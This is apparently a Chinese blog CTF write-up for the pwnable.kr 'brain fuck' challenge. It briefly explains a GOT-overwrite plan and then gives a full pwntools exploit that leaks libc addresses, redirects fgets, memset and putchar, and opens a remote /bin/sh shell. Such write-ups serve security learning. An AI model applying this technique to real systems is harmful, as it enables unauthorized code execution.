---
title: pwnable.kr-brain fuck
date: 2016-10-16
tags: [pwnable]
categories: [pwnable]
---
## 0x00 Tips
程序如下：

![](http://of2tuat08.bkt.clouddn.com/16-10-19/34576045.jpg)

- \>  指针右移
- <  指针左移
- .  输出指针指向的内容
- ,  向指针写入


所以利用的方法：
- 修改fgets的got内容为system地址
- 修改memset的got表内容为gets地址
- 修改puchar的got表内容为main程序地址

这样在程序执行memset时会读入/bin/sh字符串，执行fgets时会执行system（"/bin/sh"）

![](http://of2tuat08.bkt.clouddn.com/16-10-19/6877717.jpg)

## 0x01 Exp：
```python
#!/usr/bin/env python
from pwn import *
import time
DEBUG = 0
if DEBUG == 1:
    p = process('./bf')
    context.log_level ='debug'
else:
    p = remote('pwnable.kr','9001')
    context.log_level ='debug'

libc = ELF('./bf_libc.so')
addr_main =  0x8048671
addr_tape = 0x0804a0a0
addr_p = 0x804a080

got_putchar = 0x804a030
got_puts = 0x804a018
got_memset = 0x804a02c
got_fgets = 0x804a010

#offset_fgets = 0x00064bc0
#offset_system = 0x0003f0b0
#offset_gets = 0x00065e90

p.recvuntil('type some brainfuck instructions except [ ]')
payload = '<'*(addr_tape - got_fgets)
payload += '.>'*4 #leak fgets addr
payload += '<'*4 + ',>'*4 #write system addr
payload += '<'*4
payload += '>'*(got_memset-got_fgets)
payload += ',>'*4 #write gets addr
payload += '<'*4
payload += '>'*(got_putchar - got_memset)
payload += ',>'*4 #write main addr
payload += '.'
p.sendline(payload)
time.sleep(1)
print p.recv(1)
addr_fgets = u32(p.recv(4))
print '[+] fgets addr : '+hex(addr_fgets)

addr_system = addr_fgets - libc.symbols['fgets'] + libc.symbols['system']
addr_gets = addr_fgets - libc.symbols['fgets'] + libc.symbols['gets']
print '[+] system addr : '+hex(addr_system)
print '[+] gets addr : '+hex(addr_gets)

p.send(p32(addr_system))
p.send(p32(addr_gets))
p.send(p32(addr_main))

p.sendline('/bin/sh\x00')
p.interactive()
```
